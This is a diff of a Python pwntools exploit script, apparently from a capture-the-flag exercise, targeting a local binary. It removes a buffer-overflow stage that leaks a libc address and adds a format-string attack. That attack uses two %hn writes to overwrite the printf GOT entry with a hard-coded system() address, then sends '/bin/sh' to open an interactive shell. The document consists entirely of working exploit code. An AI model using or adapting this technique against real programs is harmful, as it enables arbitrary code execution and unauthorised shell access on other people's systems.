@@ -1,28 +1,28 @@
-#!/usr/bin/python
-
 from pwn import *
 
-def main():
-    p = process("./out")
+p = process("./out");
 
-    # Craft first stage (arbitrary read)
-    leak_address = 0x0804b2d8    # Address of "This is a Jukebox"
-    stage_1 = "A"*24 + p32(leak_address)
-    p.recvrepeat(0.2)
+#system address
+val = 0xf7e0c830
+#printf got address
+address = 0x804c00c
+#relative place in stack where given arguments appear
+stack_num = 4
 
-    # Send the first stage
-    p.send(stage_1)
+buf = p32(address)
+buf += p32(address+2)
 
-    # Parse the response
-    data = p.recvrepeat(0.2)
-    leak = data[data.find(b"(")+1:data.rfind(b")")]
-    leak = str(leak)
-    log.info("Got leaked data: %s" % leak)
-    puts_addr = u32(leak[:4])
-    log.info("puts@libc: 0x%x" % puts_addr)
+#number of bytes to write before hn
+count = 0x0c830 - len(buf)
 
+#change 2 LS bytes
+buf += "%" + str(count) + "x%" + str(stack_num) + "$hn"
 
-    p.interactive()
+count = 0xf7e0-0x0c830
 
-if __name__ == "__main__":
-    main()
+#change 2 MS bytes
+buf += "%" + str(count) + "x%" + str(stack_num+1) + "$hn"
+
+p.sendline(buf)
+p.sendline("/bin/sh")
+p.interactive()
